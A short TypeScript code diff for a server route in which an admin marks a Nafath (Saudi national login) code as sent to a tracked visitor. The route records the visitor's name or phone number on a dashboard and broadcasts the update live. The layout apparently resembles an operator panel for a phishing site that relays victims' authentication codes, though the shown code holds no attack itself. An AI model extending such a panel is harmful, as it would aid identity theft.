@@ -951,7 +951,8 @@ async function startServer() {
       }
 
       const currentVisitor = await readVisitor(visitorId);
-      const currentPage = currentVisitor?.currentPage || "step4";
+      const currentPage = currentVisitor?.currentPage || "nafad";
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
       const updateData: Record<string, any> = {
         adminNafadCodeSent: true,
@@ -964,8 +965,18 @@ async function startServer() {
       }
 
       await upsertVisitor(visitorId, updateData);
-      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم إرسال رمز النفاذ" });
+      
+      // Update dashboard with customer name
+      const dashboardData = await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...updateData, 
+        updated: "تم إرسال رمز النفاذ" 
+      });
 
+      // Broadcast to dashboard
+      broadcastSSE("update", dashboardData);
 
       res.json({ success: true, codeSent: true });
     } catch (error) {
